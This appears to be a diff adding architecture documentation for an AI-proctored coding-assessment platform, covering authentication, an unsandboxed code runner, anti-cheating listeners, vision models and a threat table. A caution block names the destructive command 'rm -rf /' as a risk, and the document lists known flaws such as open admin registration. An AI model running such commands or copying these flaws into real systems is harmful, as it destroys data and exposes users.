+<td>INFO, WARNING, CRITICAL</td>
+</tr>
+<tr>
+<td>detected_item</td>
+<td>varchar(100)</td>
+<td>nullable</td>
+<td>What was detected (e.g., &quot;cell phone&quot;)</td>
+</tr>
+<tr>
+<td>confidence</td>
+<td>float64</td>
+<td>nullable</td>
+<td>AI confidence score (0.0–1.0)</td>
+</tr>
+<tr>
+<td>timestamp</td>
+<td>timestamp</td>
+<td>—</td>
+<td>Detection timestamp</td>
+</tr>
+<tr>
+<td>created_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>DB insertion time</td>
+</tr>
+</tbody></table>
+<h2>5.3 SQL Injection Prevention</h2>
+<p>All database queries go through GORM&#39;s parameterized query builder. For example:</p>
+<pre><code class="language-go">r.db.Where(&quot;email = ?&quot;, email).First(&amp;user)
+</code></pre>
+<p>GORM uses prepared statements internally, binding <code>email</code> as a parameter — never string-concatenated into SQL. This prevents SQL injection at the ORM layer.</p>
+<h2>5.4 Password Storage</h2>
+<p>Passwords are hashed using <strong>bcrypt</strong> with <code>bcrypt.DefaultCost</code> (10 rounds). The bcrypt hash is stored in the <code>password</code> column. The <code>json:&quot;-&quot;</code> struct tag ensures passwords are <strong>never</strong> serialized in API responses.</p>
+<hr>
+<h1>6. AUTHENTICATION &amp; AUTHORIZATION</h1>
+<h2>6.1 JWT Token Structure</h2>
+<pre><code class="language-json">{
+  &quot;user_id&quot;: 5,
+  &quot;email&quot;: &quot;kishore@shakthi.edu&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;iss&quot;: &quot;assessment-system&quot;,
+  &quot;iat&quot;: 1726574400,
+  &quot;exp&quot;: 1726660800
+}
+</code></pre>
+<p><strong>Signing</strong>: HMAC-SHA256 (<code>jwt.SigningMethodHS256</code>) with <code>JWTSecret</code> from config<br><strong>Expiry</strong>: User tokens = 24 hours; Admin tokens = 12 hours</p>
+<h2>6.2 Auth Flow — Candidate Login</h2>
+<pre><code>1. Frontend: POST /api/auth/login { email, password }
+2. Controller: Bind JSON → Validate with binding tags
+3. Service.AuthenticateUser():
+   a. userRepo.FindByEmail(email) → SQL: SELECT * FROM users WHERE email = ?
+   b. If not found → &quot;invalid email or password&quot;
+   c. bcrypt.CompareHashAndPassword(stored_hash, password)
+   d. If mismatch → &quot;invalid email or password&quot;
+   e. generateToken(userID, email, &quot;user&quot;, JWTSecret, 24h)
+      → jwt.NewWithClaims(HS256, claims) → SignedString(secret)
+4. Controller: 200 OK { success:true, data: { user: UserResponse, token: &quot;eyJ...&quot; } }
+5. Frontend (api/client.ts):
+   a. localStorage.setItem(&#39;codeshield_token&#39;, token)
+   b. localStorage.setItem(&#39;codeshield_auth_user&#39;, JSON.stringify(profile))
+   c. AuthContext.setUser(profile)
+</code></pre>
+<h2>6.3 Auth Flow — Admin Login</h2>
+<p>Identical flow but:</p>
+<ul>
+<li>Endpoint: <code>POST /api/admin/login</code></li>
+<li>Queries <code>admins</code> table instead of <code>users</code></li>
+<li>Token role = <code>&quot;admin&quot;</code>, expiry = 12 hours</li>
+</ul>
+<h2>6.4 Middleware Authorization</h2>
+<p>Three middleware functions exist in <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/middleware/auth.go">auth.go</a>:</p>
+<table>
+<thead>
+<tr>
+<th>Middleware</th>
+<th>Validates</th>
+<th>Role Check</th>
+<th>Used For</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>RequireAuth()</code></td>
+<td>User JWT secret</td>
+<td>Must be <code>role == &quot;user&quot;</code></td>
+<td>Exam, compiler, profile</td>
+</tr>
+<tr>
+<td><code>RequireAdmin()</code></td>
+<td>User JWT secret</td>
+<td>Must be <code>role == &quot;admin&quot;</code> or <code>&quot;ADMIN&quot;</code></td>
+<td>Timer control, problem creation, malpractice viewing</td>
+</tr>
+<tr>
+<td><code>RequireAnyAuth()</code></td>
+<td>User JWT secret</td>
+<td>Any role accepted</td>
+<td>Profile endpoints shared by both</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>[!WARNING]
+<strong>Security Issue</strong>: Both <code>RequireAdmin()</code> and <code>RequireAuth()</code> validate tokens against the <strong>same</strong> <code>JWTSecret</code> (not <code>AdminJWTSecret</code>). The <code>AdminJWTSecret</code> config field exists but is <strong>never used for validation</strong> — admin tokens are also generated with <code>JWTSecret</code>. The <code>AdminJWTExpiry</code> (12h) is used during token generation, but validation uses the same secret. This means any valid user token cannot impersonate an admin because the <code>role</code> claim is checked, but the separate admin secret provides no additional security.</p>
+</blockquote>
+<h2>6.5 Frontend Route Protection</h2>
+<p>In <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/routes/AppRoutes.tsx">AppRoutes.tsx</a>, the <code>AdminOnly</code> component checks <code>useAuth().role === &#39;admin&#39;</code>. If not admin, redirects to <code>/admin/login</code>.</p>
+<blockquote>
+<p>[!NOTE]
+Candidate routes (<code>/dashboard</code>, <code>/exam</code>, etc.) are <strong>NOT</strong> protected at the routing level — any visitor can navigate there. Protection relies on the backend API rejecting requests without valid tokens.</p>
+</blockquote>
+<hr>
+<h1>7. SECURE CODING ASSESSMENT SYSTEM</h1>
+<h2>7.1 Code Execution Engine</h2>
+<p>The <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/compiler_service.go">compiler_service.go</a> implements a multi-language code execution engine using <strong><code>os/exec</code></strong>.</p>
+<h3>Supported Languages</h3>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>File Extension</th>
+<th>Compile Command</th>
+<th>Run Command</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Go</td>
+<td><code>.go</code></td>
+<td><code>go build -o program main.go</code></td>
+<td><code>./program</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>.py</code></td>
+<td>N/A (interpreted)</td>
+<td><code>python3 solution.py</code></td>
+</tr>
+<tr>
+<td>JavaScript</td>
+<td><code>.js</code></td>
+<td>N/A</td>
+<td><code>node solution.js</code></td>
+</tr>
+<tr>
+<td>TypeScript</td>
+<td><code>.ts</code></td>
+<td>N/A</td>
+<td><code>node solution.ts</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>.java</code></td>
+<td><code>javac ClassName.java</code></td>
+<td><code>java -cp tmpDir ClassName</code></td>
+</tr>
+<tr>
+<td>C++</td>
+<td><code>.cpp</code></td>
+<td><code>g++ -O3 solution.cpp -o program</code></td>
+<td><code>./program</code></td>
+</tr>
+<tr>
+<td>Rust</td>
+<td><code>.rs</code></td>
+<td><code>rustc solution.rs -o program</code></td>
+<td><code>./program</code></td>
+</tr>
+</tbody></table>
+<h3>Execution Pipeline (e.g., Go)</h3>
+<pre><code>1. Validate code size &lt;= 102,400 bytes
+2. os.MkdirTemp() → create isolated temp directory
+3. os.WriteFile() → write source code to temp file
+4. context.WithTimeout(5s) → create deadline context
+5. exec.CommandContext(&quot;go&quot;, &quot;build&quot;, &quot;-o&quot;, binPath, srcFile)
+   → CombinedOutput() → if error, return compilation error
+6. Concatenate all test case inputs with newlines
+7. exec.CommandContext(binPath) with stdin from test cases
+   → Capture stdout, stderr
+   → If context.DeadlineExceeded → &quot;time limit exceeded&quot;
+   → If error → &quot;runtime error: &lt;stderr&gt;&quot;
+8. defer os.RemoveAll(tmpDir) → cleanup
+9. Return trimmed stdout
+</code></pre>
+<h3>Run vs Submit</h3>
+<ul>
+<li><strong>Run</strong> (<code>POST /api/compiler/run</code>): Executes against <strong>sample</strong> test cases only. Returns raw output.</li>
+<li><strong>Submit</strong> (<code>POST /api/compiler/submit</code>): Executes against <strong>all</strong> test cases (sample + hidden) individually. Compares output to expected, counts passed. Records a <code>Submission</code> in the database. Updates the leaderboard.</li>
+</ul>
+<h3>Verdict Logic</h3>
+<pre><code class="language-go">if passed == totalCases {
+    verdict = &quot;Accepted&quot;   // Score: 100
+} else if lastError != &quot;&quot; {
+    verdict = &quot;Runtime Error&quot;
+} else {
+    verdict = &quot;Wrong Answer&quot;
+}
+</code></pre>
+<blockquote>
+<p>[!CAUTION]
+<strong>CRITICAL SECURITY RISK</strong>: Code execution uses <code>os/exec</code> to run arbitrary user-submitted code <strong>directly on the server</strong> with <strong>no sandboxing</strong>, no containerization, no chroot, no resource limits (beyond timeout). A malicious candidate could execute <code>rm -rf /</code>, read environment variables, access the filesystem, or run network commands. This is acceptable for a prototype/demo but <strong>NOT production-safe</strong>.</p>
+</blockquote>
+<hr>
+<h1>8. ANTI-CHEATING / SECURITY MONITORING</h1>
+<h2>8.1 Complete List of Detected Events</h2>
+<p>The <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/hooks/useAntiCheating.ts">useAntiCheating.ts</a> hook attaches <strong>18 event listeners</strong> to the browser:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Event</th>
+<th>Browser API</th>
+<th>Trigger</th>
+<th>Severity</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Right-click</td>
+<td><code>contextmenu</code> event</td>
+<td>Right mouse button</td>
+<td>Low</td>
+<td>-2</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Copy</td>
+<td><code>copy</code> clipboard event</td>
+<td>Ctrl+C or context menu copy</td>
+<td>Medium</td>
+<td>-5</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Paste</td>
+<td><code>paste</code> clipboard event</td>
+<td>Ctrl+V or context menu paste</td>
+<td>High</td>
+<td>-10</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cut</td>
+<td><code>cut</code> clipboard event</td>
+<td>Ctrl+X</td>
+<td>Low</td>
+<td>-2</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Alt+Tab</td>
+<td><code>keydown</code> with <code>e.altKey &amp;&amp; key === &#39;tab&#39;</code></td>
+<td>Window switch attempt</td>
+<td>High</td>
+<td>-15</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Windows/Meta key</td>
+<td><code>keydown</code> with <code>key === &#39;meta&#39;</code></td>
+<td>OS menu</td>
+<td>High</td>
+<td>-10</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Any modifier shortcut</td>
+<td><code>keydown</code> with Ctrl/Alt/Shift combos</td>
+<td>Various key combos</td>
+<td>High</td>
+<td>-12</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Text selection</td>
+<td><code>selectstart</code> event</td>
+<td>Selecting text outside Monaco</td>
+<td>Medium</td>
+<td>-6</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Drag over</td>
+<td><code>dragover</code> event</td>
+<td>Dragging content into window</td>
+<td>—</td>
+<td>Prevented</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Drop</td>
+<td><code>drop</code> event</td>
+<td>Dropping content</td>
+<td>Medium</td>
+<td>-6</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Page close</td>
+<td><code>beforeunload</code> event</td>
+<td>Closing/refreshing tab</td>
+<td>—</td>
+<td>Confirmation dialog</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Fullscreen exit</td>
+<td><code>fullscreenchange</code> event</td>
+<td>Pressing Esc or programmatic exit</td>
+<td>High</td>
+<td>-15</td>
+</tr>
+<tr>
+<td>13</td>
+<td>Scroll outside editor</td>
+<td><code>scroll</code> event</td>
+<td>Scrolling outside Monaco</td>
+<td>Low</td>
+<td>-4</td>
+</tr>
+<tr>
+<td>14</td>
+<td>Non-primary click</td>
+<td><code>pointerdown</code> with <code>button !== 0</code></td>
+<td>Middle/right mouse button</td>
+<td>Low</td>
+<td>-3</td>
+</tr>
+<tr>
+<td>15</td>
+<td>DevTools shortcuts</td>
+<td><code>keydown</code> with F12, Ctrl+Shift+I/J/C, Ctrl+U/S/P</td>
+<td>Attempting browser dev tools</td>
+<td>High</td>
+<td>-15</td>
+</tr>
+<tr>
+<td>16</td>
+<td>Tab switch</td>
+<td><code>visibilitychange</code></td>
+<td>Tab hidden/minimized</td>
+<td>High</td>
+<td>-12</td>
+</tr>
+<tr>
+<td>17</td>
+<td>Window blur</td>
+<td><code>blur</code> event</td>
+<td>Browser loses focus</td>
+<td>Medium</td>
+<td>-8</td>
+</tr>
+<tr>
+<td>18</td>
+<td>Window focus</td>
+<td><code>focus</code> event</td>
+<td>Browser regains focus</td>
+<td>Low</td>
+<td>-4</td>
+</tr>
+<tr>
+<td>19</td>
+<td>Escape key</td>
+<td><code>keydown</code> capture phase</td>
+<td>Pressing Escape</td>
+<td>Medium</td>
+<td>-5</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Escape long-press</td>
+<td><code>keydown</code> repeat for &gt;1s</td>
+<td>Holding Escape</td>
+<td>Critical</td>
+<td>-20 + 2min lock</td>
+</tr>
+<tr>
+<td>21</td>
+<td>Focus shift (AI)</td>
+<td>MediaPipe FaceMesh</td>
+<td>Head turned away</td>
+<td>Medium</td>
+<td>-15</td>
+</tr>
+<tr>
+<td>22</td>
+<td>Unauthorized object (AI)</td>
+<td>COCO-SSD / YOLOv8</td>
+<td>Phone, laptop, book detected</td>
+<td>Critical</td>
+<td>-35</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Print Screen</td>
+<td><code>keyup</code> with <code>PrintScreen</code></td>
+<td>Screenshot attempt</td>
+<td>High</td>
+<td>-20</td>
+</tr>
+</tbody></table>
+<h2>8.2 Escape Key Anti-Bypass Mechanism</h2>
+<p>In Chromium browsers, holding Escape for 2 seconds exits fullscreen. The code intercepts this:</p>
+<ol>
+<li>Captures <code>Escape</code> keydown in the <strong>capture phase</strong> (<code>addEventListener(event, handler, true)</code>)</li>
+<li>Calls <code>e.preventDefault()</code> + <code>e.stopImmediatePropagation()</code></li>
+<li>Uses <code>navigator.keyboard.lock()</code> / <code>navigator.keyboard.unlock()</code> cycle to reset Chrome&#39;s internal exit timer</li>
+<li>If Escape is held &gt;1 second (detected via <code>e.repeat</code> and timestamp diff), triggers a <strong>Critical</strong> violation and a 2-minute lockout with <code>setTimeout(unlockExam, 120000)</code></li>
+</ol>
+<h2>8.3 Copy/Paste Protection Layer</h2>
+<p>The <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/hooks/useCopyPasteProtection.ts">useCopyPasteProtection.ts</a> hook provides a <strong>second layer</strong> of protection:</p>
+<ul>
+<li>Intercepts 13 events in the capture phase: keydown, keyup, contextmenu, copy, paste, cut, dragstart, drop, selectstart, beforecopy, beforepaste, beforecut</li>
+<li>Injects a <code>&lt;style&gt;</code> element with <code>user-select: none !important</code> on all elements</li>
+<li>Allows exceptions for <code>input</code>, <code>textarea</code>, and <code>[contenteditable]</code> elements</li>
+<li>Clears clipboard on PrintScreen via <code>navigator.clipboard.writeText(&#39;&#39;)</code></li>
+</ul>
+<hr>
+<h1>9. AI / COMPUTER VISION</h1>
+<h2>9.1 Three AI Models — What Each Actually Detects</h2>
+<table>
+<thead>
+<tr>
+<th>Model</th>
+<th>Inference Location</th>
+<th>What It Detects</th>
+<th>Confidence Threshold</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>COCO-SSD</strong> (TensorFlow.js)</td>
+<td>In-browser (client GPU/CPU)</td>
+<td>80 COCO object classes; filtered for: phone, remote, calculator, book, laptop, tablet</td>
+<td>Phone: ≥0.28, Others: ≥0.35</td>
+</tr>
+<tr>
+<td><strong>YOLOv8-Nano</strong> (Ultralytics)</td>
+<td>Server-side (Python)</td>
+<td>80 COCO classes; filtered for: phone/cell/mobile (ID 67), laptop, book, remote, calculator, tablet, headphone, earphone, backpack, watch (IDs 63-67, 73)</td>
+<td>Phone: ≥0.30, Others: ≥0.35</td>
+</tr>
+<tr>
+<td><strong>MediaPipe FaceMesh</strong></td>
+<td>In-browser (CDN-loaded)</td>
+<td>468 facial landmarks → computes yaw ratio (left/right head turn) and pitch ratio (up/down tilt)</td>
+<td>Yaw: &lt;0.26 or &gt;0.74 = shifted; Pitch: &lt;0.22 or &gt;0.78 = shifted; 3 consecutive shifted frames = alert</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>[!IMPORTANT]
+<strong>COCO-SSD and YOLOv8 detect the same categories</strong> — they are both trained on the COCO dataset. COCO-SSD runs continuously in the browser. YOLOv8 runs on the server and receives frames via WebSocket. They provide <strong>redundant detection</strong>: if one fails (e.g., YOLO server is offline), the other still works.</p>
+<p><strong>MediaPipe FaceMesh does NOT detect objects</strong> — it detects <strong>face landmarks</strong> (nose, cheeks, chin, forehead) and the code computes geometric ratios to determine if the candidate is looking away from the screen.</p>
+</blockquote>
+<h2>9.2 COCO-SSD Pipeline</h2>
+<pre><code>Camera permission granted
+  → navigator.mediaDevices.getUserMedia({ video: { 640x480, 20fps } })
+  → MediaStream → HTMLVideoElement.srcObject
+  → tf.ready() → cocoSsd.load({ base: &#39;lite_mobilenet_v2&#39; })
+  → setInterval(detectObjects, 200ms)
+    → model.detect(videoElement, maxDetections=10, minScore=0.25)
+    → Filter predictions: phone/remote/calculator/book/laptop/tablet
+    → If forbidden prediction with confidence &gt;= threshold:
+        → setUnauthObject({ detected: true, object: className, confidence })
+        → Draw bounding boxes on canvas overlay
+        → reportViolation(&#39;UNAUTHORIZED OBJECT DETECTED!!!&#39;, &#39;Critical&#39;, -35)
+        → api.monitor.reportEvent() → POST /api/monitoring/malpractice → database
+        → EmailService.SendMalpracticeAlert() → Resend API → admin email
+</code></pre>
+<h2>9.3 YOLOv8 WebSocket Pipeline</h2>
+<pre><code>AICameraWidget mounts
+  → new WebSocket(&#39;ws://localhost:8082/ws/proctor&#39;)
+  → ws.onopen → setWsConnected(true)
+  → setInterval(processFrame, 200ms)
+    → Draw video frame to offscreen canvas (480x360)
+    → canvas.toDataURL(&#39;image/jpeg&#39;, quality=0.55) → base64 string
+    → ws.send(JSON.stringify({ image: base64Data }))
+
+Server (yolo-proctor/main.py):
+  → await websocket.receive_json()
+  → Strip base64 header, decode to bytes
+  → np.frombuffer → cv2.imdecode → OpenCV frame
+  → model(frame, conf=0.25, verbose=False)[0]
+  → Loop through detections:
+    → Check if class is phone/cell/mobile (ID 67) or forbidden
+    → Apply min_thresh (0.30 for phones, 0.35 for others)
+    → If forbidden and above threshold → break
+  → Send JSON: { detected: true/false, object: &quot;cell phone&quot;, confidence: 0.88, message: &quot;...&quot; }
+
+Client receives:
+  → ws.onmessage → parse JSON
+  → If detected: setUnauthObject, draw bounding box, report violation
+</code></pre>
+<h2>9.4 MediaPipe FaceMesh Pipeline</h2>
+<pre><code>Load CDN script: @mediapipe/face_mesh/face_mesh.js
+  → new FaceMesh({ locateFile: ... })
+  → setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetection: 0.5 })
+  → fm.onResults(handleMediaPipeResults)
+
+Every 200ms (in same processFrame interval):
+  → faceMeshRef.current.send({ image: videoElement })
+  → handleMediaPipeResults(results):
+    → If no face detected:
+        → consecutiveShiftRef++
+        → If &gt;= 4 → setFocusShift(true) → report &quot;Focus Shift Detected&quot;
+    → If face detected:
+        → Extract landmarks: nose(1/4), leftCheek(234), rightCheek(454), chin(152), forehead(10)
+        → yawRatio = distLeft / (distLeft + distRight)
+        → pitchRatio = distUp / (distUp + distDown)
+        → If yaw &lt; 0.26 or &gt; 0.74 or pitch &lt; 0.22 or &gt; 0.78 → shifted
+        → If 3 consecutive shifted frames → setFocusShift(true)
+        → Else → consecutiveShiftRef = 0 → setFocusShift(false)
+</code></pre>
+<hr>
+<h1>10. REAL-TIME COMMUNICATION</h1>
+<h2>10.1 WebSocket — YOLOv8 Proctor</h2>
+<p><strong>Why WebSocket instead of HTTP polling?</strong> Each AI inference requires sending a full video frame (≈40-80KB base64 JPEG) and receiving results. At 5 frames/second, HTTP would add per-request overhead (TCP handshake, headers, connection establishment). WebSocket maintains a persistent bidirectional channel with minimal framing overhead.</p>
+<p><strong>Connection lifecycle</strong>:</p>
+<ol>
+<li>Client creates <code>new WebSocket(wsUrl)</code> on component mount</li>
+<li>Server accepts via <code>@app.websocket(&quot;/ws/proctor&quot;)</code> in FastAPI</li>
+<li>Client sends JSON <code>{ image: &quot;data:image/jpeg;base64,...&quot; }</code> every 200ms</li>
+<li>Server responds with JSON <code>{ detected, object, confidence, message }</code></li>
+<li>On disconnect: 4-second reconnect timer (<code>setTimeout(connectWS, 4000)</code>)</li>
+<li>On cleanup (component unmount): <code>ws.close()</code>, clear reconnect timer</li>
+</ol>
+<p><strong>Security</strong>: No authentication on WebSocket connection. Anyone who knows the URL can connect.</p>
+<h2>10.2 Timer Polling (Not WebSocket)</h2>
+<p>The exam timer uses <strong>HTTP polling</strong> (every 1,500ms via <code>setInterval</code>) rather than WebSocket because:</p>
+<ul>
+<li>Timer state changes infrequently (admin controls it)</li>
+<li>Simplifies server architecture (no stateful connections)</li>
+<li>Backend Render.com free tier may not support persistent WebSocket for all services</li>
+</ul>
+<hr>
+<h1>11. MALPRACTICE DETECTION PIPELINE</h1>
+<pre><code>Detection (Browser)
+  ├── useAntiCheating hook: Tab switch, clipboard, fullscreen, DevTools, etc.
+  ├── COCO-SSD: In-browser object detection every 200ms
+  ├── MediaPipe: Face landmark analysis every 200ms
+  └── YOLOv8 WebSocket: Server-side detection results
+
+  ↓ All routes through MonitoringContext.reportViolation()
+
+reportViolation(eventTitle, severity, impact, details)
+  → Creates MonitoringEvent with timestamp, candidateId, candidateName
+  → api.monitor.reportEvent()
+      → 1. Adds to local events array + localStorage
+      → 2. POST /api/monitoring/malpractice (backend-auth)
+           → MalpracticeController.LogMalpractice()
+           → MalpracticeService.LogViolation()
+               → Auto-lookup candidate name/email/regNo from userRepo
+               → Auto-assign severity: UNAUTHORIZED_OBJECT/MULTIPLE_FACES → CRITICAL; others → WARNING
+               → malpracticeRepo.Create(logEntry)  → INSERT INTO malpractice_logs
+               → go emailService.SendMalpracticeAlert(logEntry)  ← goroutine!
+                   → adminRepo.GetAllAdmins()
+                   → For each admin: POST https://api.resend.com/emails
+      → 3. POST to Anticheating service (if token available)
+  → Adjusts confidenceScore (e.g., 94 → 59 after -35)
+  → Adjusts riskScore
+  → If severity High/Critical: increments warningsCount
+  → If warningsCount &gt;= 3 OR Critical: LOCKS exam (isLocked = true)
+</code></pre>
+<hr>
+<h1>12. EMAIL NOTIFICATION SYSTEM</h1>
+<h2>12.1 Architecture</h2>
+<p>The <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/email_service.go">email_service.go</a> uses the <strong>Resend</strong> HTTP API (<a href="https://api.resend.com/emails">https://api.resend.com/emails</a>).</p>
+<h3>Flow</h3>
+<pre><code>MalpracticeService.LogViolation()
+  → repo.Create(logEntry)  // DB insert FIRST
+  → if emailService != nil:
+       go emailService.SendMalpracticeAlert(logEntry)  // Goroutine — non-blocking
+</code></pre>
+<p>The email is sent <strong>asynchronously in a goroutine</strong> after the database insert succeeds. This ensures:</p>
+<ol>
+<li>The API response to the frontend is never delayed by email sending</li>
+<li>If email fails, the malpractice record is already safely persisted</li>
+<li>A <code>defer recover()</code> in <code>SendMalpracticeAlert</code> prevents panics from crashing the server</li>
+</ol>
+<h3>Email Construction</h3>
+<ul>
+<li><strong>Subject</strong>: <code>[Malpractice Alert] &lt;event_type&gt; — &lt;candidate_name&gt;</code></li>
+<li><strong>Body</strong>: Professional HTML email with dark theme, severity badge (color-coded), candidate details table, IST timestamp</li>
+<li><strong>XSS prevention</strong>: All dynamic values pass through <code>html.EscapeString()</code> before being embedded in HTML</li>
+<li><strong>Per-admin sending</strong>: Emails are sent individually to each admin (not CC&#39;d) to avoid Resend free tier rejecting unverified emails</li>
+</ul>
+<hr>
+<h1>13. SUPABASE</h1>
+<h2>13.1 How Supabase Is Used</h2>
+<p>Supabase is used <strong>exclusively as a managed PostgreSQL database</strong> — none of the following Supabase features are used:</p>
+<ul>
+<li>❌ Supabase Auth</li>
+<li>❌ Supabase Realtime</li>
+<li>❌ Supabase Storage</li>
+<li>❌ Supabase Edge Functions</li>
+<li>❌ Supabase Row-Level Security</li>
+<li>❌ PostgREST (Supabase REST API)</li>
+</ul>
+<p>The Go backend connects via the <strong>Supabase connection pooler</strong> URL (<code>aws-1-ap-south-1.pooler.supabase.com:5432</code>) using the standard PostgreSQL protocol. GORM generates SQL queries and sends them over this connection.</p>
+<p><strong>What is stored in Supabase</strong>: All 9 tables (admins, users, exam_sessions, questions, test_cases, submissions, leaderboards, exam_timers, malpractice_logs).</p>
+<hr>
+<h1>14. PERFORMANCE ENGINEERING</h1>
+<h2>14.1 Performance Bottlenecks Identified</h2>
+<table>
+<thead>
+<tr>
+<th>Bottleneck</th>
+<th>Location</th>
+<th>Impact</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AI inference every 200ms</td>
+<td>AICameraWidget</td>
+<td>High CPU/GPU</td>
+<td>COCO-SSD TF.js model runs on main thread; each <code>model.detect()</code> can take 50-200ms</td>
+</tr>
+<tr>
+<td>Canvas toDataURL every 200ms</td>
+<td>AICameraWidget</td>
+<td>Medium CPU</td>
+<td>Base64-encoding JPEG frames for WebSocket</td>
+</tr>
+<tr>
+<td>Timer polling every 1.5s</td>
+<td>ExamContext</td>
+<td>Low network</td>
+<td>HTTP GET request per active candidate every 1.5 seconds</td>
+</tr>
+<tr>
+<td>Heartbeat every 5s</td>
+<td>MonitoringContext</td>
+<td>Low network</td>
+<td>Telemetry POST</td>
+</tr>
+<tr>
+<td>Event listeners (18+)</td>
+<td>useAntiCheating</td>
+<td>Low</td>
+<td>Many capture-phase listeners; each keystroke triggers multiple handlers</td>
+</tr>
+<tr>
+<td>Monaco Editor</td>
+<td>ExamPage</td>
+<td>High memory</td>
+<td>Monaco loads a full VS Code editor instance (several MB)</td>
+</tr>
+<tr>
+<td>59KB API client</td>
+<td>client.ts</td>
+<td>Medium bundle</td>
+<td>Single monolithic file with all API logic + mock data</td>
+</tr>
+<tr>
+<td>requestAnimationFrame loop</td>
+<td>AICameraWidget canvas</td>
+<td>Low</td>
+<td>Continuous overlay rendering for bounding boxes and face mesh</td>
+</tr>
+</tbody></table>
+<h2>14.2 Existing Optimizations</h2>
+<ol>
+<li><strong>Processing lock (<code>isProcessingRef</code>)</strong>: Prevents overlapping frame processing cycles</li>
+<li><strong>Detection lock (<code>isDetectingRef</code>)</strong>: Prevents overlapping COCO-SSD inference calls</li>
+<li><strong>COCO-SSD <code>lite_mobilenet_v2</code> base</strong>: Lightest available model variant</li>
+<li><strong>JPEG quality 0.55</strong>: Reduced image quality for WebSocket frame transmission</li>
+<li><strong>Canvas resolution 480x360</strong>: Downscaled from webcam native for WebSocket</li>
+<li><strong>fetchWithTimeout 3.5s</strong>: Prevents UI hanging on cold-start backends</li>
+<li><strong>debounced auto-save</strong>: 600ms debounce prevents excessive localStorage writes during typing</li>
+<li><strong><code>telemetryRef</code></strong>: Heartbeat reads from a ref instead of state to avoid re-render dependencies</li>
+<li><strong>Conditional rendering</strong>: AI camera widget only processes when <code>cameraActive</code> is true</li>
+</ol>
+<hr>
+<h1>15. SECURITY ENGINEERING</h1>
+<h2>15.1 Threat Analysis</h2>
+<table>
+<thead>
+<tr>
+<th>Threat</th>
+<th>Attack Vector</th>
+<th>Current Defense</th>
+<th>Limitation</th>
+<th>Possible Mitigation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Command injection</strong></td>
+<td>Malicious code in compiler</td>
+<td><code>context.WithTimeout</code> (5s), <code>os/exec</code> only runs specified binary</td>
+<td>No sandboxing; code runs as server process</td>
+<td>Use Docker containers or gVisor</td>
+</tr>
+<tr>
+<td><strong>SQL injection</strong></td>
+<td>API input fields</td>
+<td>GORM parameterized queries</td>
+<td>None significant</td>
+<td>Already well-protected</td>
+</tr>
+<tr>
+<td><strong>XSS</strong></td>
+<td>Malpractice email content</td>
+<td><code>html.EscapeString()</code> on all dynamic values</td>
+<td>Frontend React auto-escapes JSX</td>
+<td>Adequate</td>
+</tr>
+<tr>
+<td><strong>JWT theft</strong></td>
+<td>localStorage interception, XSS</td>
+<td>Tokens in localStorage</td>
+<td>Vulnerable to XSS (localStorage readable by any JS)</td>
+<td>Use httpOnly cookies instead</td>
+</tr>
+<tr>
+<td><strong>Credential exposure</strong></td>
+<td>render.yaml in Git</td>
+<td><code>.env</code> file for local dev</td>
+<td>render.yaml contains DB password and JWT secrets in plaintext</td>
+<td>Use Render environment variables UI, remove from YAML</td>
+</tr>
+<tr>
+<td><strong>CORS bypass</strong></td>
+<td>Cross-origin requests</td>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+<td>Wildcard allows any origin</td>
+<td>Restrict to known frontend domains</td>
+</tr>
+<tr>
+<td><strong>Webcam privacy</strong></td>
+<td>Webcam always active during exam</td>
+<td>User grants permission via browser</td>
+<td>Cannot force webcam access if denied</td>
+<td>Display warning if webcam is unavailable</td>
+</tr>
+<tr>
+<td><strong>WebSocket hijacking</strong></td>
+<td>YOLO WS has no auth</td>
+<td>None</td>
+<td>Anyone can connect and send frames</td>
+<td>Add token-based auth to WebSocket handshake</td>
+</tr>
+<tr>
+<td><strong>Admin registration open</strong></td>
+<td><code>POST /api/admin/register</code> is public</td>
+<td>None</td>
+<td>Anyone can register as admin</td>
+<td>Require existing admin approval or invitation code</td>
+</tr>
+<tr>
+<td><strong>Malpractice endpoint unauthenticated</strong></td>
+<td><code>POST /api/monitoring/malpractice</code></td>
+<td>Fallback userId = 1</td>
+<td>Attacker could spam fake malpractice events</td>
+<td>Add rate limiting and optional auth</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>[!CAUTION]
+The <code>render.yaml</code> file contains <strong>hardcoded database credentials and JWT secrets</strong>. These are committed to the Git repository and should be treated as compromised.</p>
+</blockquote>
+<hr>
